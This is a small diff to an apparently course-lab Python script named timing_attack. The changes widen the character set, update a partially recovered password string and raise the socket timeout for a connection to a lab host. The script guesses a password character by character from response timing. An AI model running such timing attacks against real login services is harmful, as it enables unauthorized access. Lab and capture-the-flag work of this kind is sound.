@@ -4,8 +4,8 @@ import string
 
 def timing_attack():
 
-    charset = string.ascii_letters + string.digits + string.punctuation
-    discovered_password = "B3W4R3A"
+    charset = ' ' + string.ascii_letters + string.digits + string.punctuation
+    discovered_password = "B3W4R30fTC"
 
     try:
     
@@ -25,7 +25,7 @@ def timing_attack():
 
                     # get prompt message
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(10)
+                    s.settimeout(15)
 
 
                     s.connect(('ec521network', 1234))
